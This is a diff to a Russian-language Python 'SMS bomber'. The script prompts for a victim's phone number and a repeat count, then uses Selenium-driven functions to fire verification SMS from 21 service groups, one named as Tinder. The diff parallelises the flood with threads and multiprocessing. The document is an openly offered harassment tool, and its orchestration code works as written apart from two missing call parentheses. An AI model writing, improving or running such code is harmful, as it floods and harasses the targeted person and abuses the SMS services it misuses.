@@ -2,14 +2,9 @@
 from selenium import webdriver
 import time
 import threading
+import multiprocessing
 
 
-print('СМС бомбер. \n Чтоб Заспамить номер телефона , введите его, без +7  ')
-number = input()
-print('введен номер', number)
-print('Введите количество повторов')
-raz = input()
-print('введено повторов ', raz)
 
 # Как гласит правило - не повторяй свой код - поэтому сначала напишем простую функцию запуска драйвера
 def SMS_bomber_WebDriver():
@@ -826,68 +821,126 @@ def SMS_bomber_all_service21(number):
     SMS_bomber_Tinder(number)
     print('Сервисы закончились')
 
-raz=int(raz)
-for i in range(raz):
-    t1 = threading.Thread(target=SMS_bomber_all_service1, args=(number,))
-    t2 = threading.Thread(target=SMS_bomber_all_service2, args=(number,))
-    t3 = threading.Thread(target=SMS_bomber_all_service3, args=(number,))
-    t4 = threading.Thread(target=SMS_bomber_all_service4, args=(number,))
-    t5 = threading.Thread(target=SMS_bomber_all_service5, args=(number,))
-    t6 = threading.Thread(target=SMS_bomber_all_service6, args=(number,))
-    t7 = threading.Thread(target=SMS_bomber_all_service7, args=(number,))
-    t8 = threading.Thread(target=SMS_bomber_all_service8, args=(number,))
-    t9 = threading.Thread(target=SMS_bomber_all_service9, args=(number,))
-    t10 = threading.Thread(target=SMS_bomber_all_service10, args=(number,))
-    t11 = threading.Thread(target=SMS_bomber_all_service11, args=(number,))
-    t12 = threading.Thread(target=SMS_bomber_all_service12, args=(number,))
-    t13 = threading.Thread(target=SMS_bomber_all_service13, args=(number,))
-    t14 = threading.Thread(target=SMS_bomber_all_service14, args=(number,))
-    t15 = threading.Thread(target=SMS_bomber_all_service15, args=(number,))
-    t16 = threading.Thread(target=SMS_bomber_all_service16, args=(number,))
-    t17 = threading.Thread(target=SMS_bomber_all_service17, args=(number,))
-    t18 = threading.Thread(target=SMS_bomber_all_service18, args=(number,))
-    t19 = threading.Thread(target=SMS_bomber_all_service19, args=(number,))
-    t20 = threading.Thread(target=SMS_bomber_all_service20, args=(number,))
-    t21 = threading.Thread(target=SMS_bomber_all_service21, args=(number,))
-    t1.start()
-    t2.start()
-    t3.start()
-    t4.start()
-    t5.start()
-    t6.start()
-    t7.start()
-    t8.start()
-    t9.start()
-    t10.start()
-    t11.start()
-    t12.start()
-    t13.start()
-    t14.start()
-    t15.start()
-    t16.start()
-    t17.start()
-    t18.start()
-    t19.start()
-    t20.start()
-    t21.start()
-    t1.join()
-    t2.join()
-    t3.join()
-    t4.join()
-    t5.join()
-    t6.join()
-    t7.join()
-    t8.join()
-    t9.join()
-    t10.join()
-    t11.join()
-    t12.join()
-    t13.join()
-    t14.join()
-    t15.join()
-    t16.join()
-    t17.join()
-    t18.join()
-    t19.join()
-    t20.join()
-    t21.join()
+def Sms_multi_1(number):
+
+        t1 = threading.Thread(target=SMS_bomber_all_service1, args=(number,))
+        t2 = threading.Thread(target=SMS_bomber_all_service2, args=(number,))
+        t3 = threading.Thread(target=SMS_bomber_all_service3, args=(number,))
+        t4 = threading.Thread(target=SMS_bomber_all_service4, args=(number,))
+
+        t1.start()
+        t2.start()
+        t3.start()
+        t4.start()
+
+        t1.join()
+        t2.join()
+        t3.join()
+        t4.join
+
+def Sms_multi_2(number):
+
+        t5 = threading.Thread(target=SMS_bomber_all_service5, args=(number,))
+        t6 = threading.Thread(target=SMS_bomber_all_service6, args=(number,))
+        t7 = threading.Thread(target=SMS_bomber_all_service7, args=(number,))
+        t8 = threading.Thread(target=SMS_bomber_all_service8, args=(number,))
+
+        t5.start()
+        t6.start()
+        t7.start()
+        t8.start()
+
+        t5.join()
+        t6.join()
+        t7.join()
+        t8.join()
+
+
+def Sms_multi_3(number):
+
+        t9 = threading.Thread(target=SMS_bomber_all_service9, args=(number,))
+        t10 = threading.Thread(target=SMS_bomber_all_service10, args=(number,))
+        t11 = threading.Thread(target=SMS_bomber_all_service11, args=(number,))
+        t12 = threading.Thread(target=SMS_bomber_all_service12, args=(number,))
+
+        
+        t9.start()
+        t10.start()
+        t11.start()
+        t12.start
+
+        
+        t9.join()
+        t10.join()
+        t11.join()
+        t12.join()
+
+def Sms_multi_4(number):
+
+        t13 = threading.Thread(target=SMS_bomber_all_service13, args=(number,))
+        t14 = threading.Thread(target=SMS_bomber_all_service14, args=(number,))
+        t15 = threading.Thread(target=SMS_bomber_all_service15, args=(number,))
+        t16 = threading.Thread(target=SMS_bomber_all_service16, args=(number,))
+
+        t13.start()
+        t14.start()
+        t15.start()
+        t16.start()
+
+        t13.join()
+        t14.join()
+        t15.join()
+        t16.join()
+
+
+def Sms_multi_5(number):
+
+
+        t17 = threading.Thread(target=SMS_bomber_all_service17, args=(number,))
+        t18 = threading.Thread(target=SMS_bomber_all_service18, args=(number,))
+        t19 = threading.Thread(target=SMS_bomber_all_service19, args=(number,))
+        t20 = threading.Thread(target=SMS_bomber_all_service20, args=(number,))
+        t21 = threading.Thread(target=SMS_bomber_all_service21, args=(number,))
+
+        t17.start()
+        t18.start()
+        t19.start()
+        t20.start()
+        t21.start()
+
+        t17.join()
+        t18.join()
+        t19.join()
+        t20.join()
+        t21.join()
+
+if __name__ == "__main__":
+    
+    print('СМС бомбер. \n Чтоб Заспамить номер телефона , введите его, без +7  ')
+    number = input()
+    print('введен номер', number)
+    print('Введите количество повторов')
+    raz = input()
+    print('введено повторов ', raz)
+
+
+    raz=int(raz)
+    for i in range(raz):
+
+            p1 = multiprocessing.Process(target=Sms_multi_1, args=(number,))
+            p2 = multiprocessing.Process(target=Sms_multi_2, args=(number,))
+            p3 = multiprocessing.Process(target=Sms_multi_3, args=(number,))
+            p4 = multiprocessing.Process(target=Sms_multi_4, args=(number,))
+            p5 = multiprocessing.Process(target=Sms_multi_5, args=(number,))
+
+            p1.start()
+            p2.start()
+            p3.start()
+            p4.start()
+            p5.start()
+
+            p1.join()
+            p2.join()
+            p3.join()
+            p4.join()
+            p5.join()
